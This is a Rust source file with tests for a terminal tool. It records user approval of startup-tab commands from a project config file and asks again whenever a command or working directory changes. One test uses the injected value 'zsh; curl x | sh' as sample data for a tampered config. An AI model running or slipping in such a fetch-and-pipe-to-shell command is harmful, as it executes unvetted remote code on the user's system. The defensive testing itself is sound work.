//! Persisted consent for a project-local `.spycrc.toml`'s startup tabs.
//!
//! Those tabs spawn commands at launch, so they open only once the user has
//! approved them. An answer binds to the **exact list** — every command and
//! cwd, in order — not to the project: a `git pull` that changes the list asks
//! again, the way `direnv` re-blocks an edited `.envrc`. Labels are display
//! only, so renaming a tab doesn't.
//!
//! A `{rc_path: {allow, tabs}}` JSON map in the XDG state dir, keyed by the
//! canonical path of the rc that declared the list. Best-effort like the other
//! state files: a missing or corrupt store reads as never asked.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::config::PaneTabConfig;

/// The recorded answer for one rc's current startup-tab list.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Consent {
    /// Never answered, or answered for a list that has since changed.
    Unasked,
    Allowed,
    Denied,
}

/// The part of a tab that decides what runs.
#[derive(Debug, PartialEq, Eq, Serialize, Deserialize)]
struct Identity {
    command: String,
    cwd: Option<PathBuf>,
}

#[derive(Serialize, Deserialize)]
struct Record {
    allow: bool,
    tabs: Vec<Identity>,
}

// SPYC-TRAP(startup-tab-consent-content): an answer matches only while every field that changes what runs is equal; a PaneTabConfig field that changes it must join Identity, or an edited rc runs under an old approval.
fn identity(tabs: &[PaneTabConfig]) -> Vec<Identity> {
    tabs.iter()
        .map(|t| Identity {
            command: t.command.clone(),
            cwd: t.cwd.clone(),
        })
        .collect()
}

fn key(rc: &Path) -> String {
    rc.canonicalize()
        .unwrap_or_else(|_| rc.to_path_buf())
        .to_string_lossy()
        .into_owned()
}

fn disk_path() -> Option<PathBuf> {
    crate::state::state_root().map(|d| d.join("tab_consent.json"))
}

fn load() -> HashMap<String, Record> {
    disk_path()
        .and_then(|p| std::fs::read_to_string(p).ok())
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default()
}

fn save(map: &HashMap<String, Record>) {
    let Some(path) = disk_path() else {
        return;
    };
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    if let Ok(text) = serde_json::to_string(map) {
        let _ = crate::fs::write_atomic(&path, text.as_bytes());
    }
}

/// The recorded answer for `tabs` as declared by `rc`.
#[must_use]
pub fn consent_for(rc: &Path, tabs: &[PaneTabConfig]) -> Consent {
    match load().get(&key(rc)) {
        Some(r) if r.tabs == identity(tabs) => {
            if r.allow {
                Consent::Allowed
            } else {
                Consent::Denied
            }
        }
        _ => Consent::Unasked,
    }
}

/// Persist the answer for this exact list (a write failure just means the
/// next launch asks again).
pub fn set_consent(rc: &Path, tabs: &[PaneTabConfig], allow: bool) {
    let mut map = load();
    map.insert(
        key(rc),
        Record {
            allow,
            tabs: identity(tabs),
        },
    );
    save(&map);
}

/// Drop any answer recorded for `rc`, so the next launch asks. Whether there
/// was one to drop.
pub fn forget(rc: &Path) -> bool {
    let mut map = load();
    let had = map.remove(&key(rc)).is_some();
    if had {
        save(&map);
    }
    had
}

#[cfg(test)]
mod tests {
    use super::{Consent, consent_for, forget, set_consent};
    use crate::config::PaneTabConfig;
    use std::path::{Path, PathBuf};

    fn tab(command: &str, cwd: Option<&str>, label: Option<&str>) -> PaneTabConfig {
        PaneTabConfig {
            command: command.to_string(),
            cwd: cwd.map(PathBuf::from),
            label: label.map(str::to_string),
        }
    }

    #[test]
    fn an_answer_holds_for_the_same_list_and_its_file_only() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let a = Path::new("/repo/a/.spycrc.toml");
            let b = Path::new("/repo/b/.spycrc.toml");
            let tabs = [tab("claude", None, None), tab("zsh", Some("docs"), None)];
            assert_eq!(consent_for(a, &tabs), Consent::Unasked);
            set_consent(a, &tabs, true);
            set_consent(b, &tabs, false);
            assert_eq!(consent_for(a, &tabs), Consent::Allowed);
            assert_eq!(consent_for(b, &tabs), Consent::Denied);
            assert_eq!(
                consent_for(Path::new("/repo/c/.spycrc.toml"), &tabs),
                Consent::Unasked
            );
            // A later answer replaces the earlier one.
            set_consent(a, &tabs, false);
            assert_eq!(consent_for(a, &tabs), Consent::Denied);
        });
    }

    /// The property the whole store exists for: approval of one list is not
    /// approval of the next. Any change to what runs — a command, a cwd, a tab
    /// added, removed or reordered — reads as never asked.
    #[test]
    fn any_change_to_what_runs_asks_again() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let rc = Path::new("/repo/.spycrc.toml");
            let approved = [tab("claude", None, None), tab("zsh", Some("docs"), None)];
            set_consent(rc, &approved, true);
            for changed in [
                vec![
                    tab("claude", None, None),
                    tab("zsh; curl x | sh", Some("docs"), None),
                ],
                vec![tab("claude", None, None), tab("zsh", Some("/"), None)],
                vec![tab("claude", None, None), tab("zsh", None, None)],
                vec![tab("claude", None, None)],
                vec![
                    tab("claude", None, None),
                    tab("zsh", Some("docs"), None),
                    tab("htop", None, None),
                ],
                vec![tab("zsh", Some("docs"), None), tab("claude", None, None)],
            ] {
                assert_eq!(
                    consent_for(rc, &changed),
                    Consent::Unasked,
                    "{changed:?} ran under an approval of {approved:?}"
                );
            }
        });
    }

    #[test]
    fn a_label_change_keeps_the_answer() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let rc = Path::new("/repo/.spycrc.toml");
            set_consent(rc, &[tab("claude", None, None)], true);
            assert_eq!(
                consent_for(rc, &[tab("claude", None, Some("coordinator"))]),
                Consent::Allowed
            );
        });
    }

    #[test]
    fn forget_drops_only_that_files_answer() {
        let tmp = tempfile::tempdir().unwrap();
        crate::state::with_state_root(tmp.path(), || {
            let a = Path::new("/repo/a/.spycrc.toml");
            let b = Path::new("/repo/b/.spycrc.toml");
            let tabs = [tab("claude", None, None)];
            set_consent(a, &tabs, true);
            set_consent(b, &tabs, true);
            assert!(forget(a));
            assert!(!forget(a), "nothing left to forget");
            assert_eq!(consent_for(a, &tabs), Consent::Unasked);
            assert_eq!(consent_for(b, &tabs), Consent::Allowed);
        });
    }
}
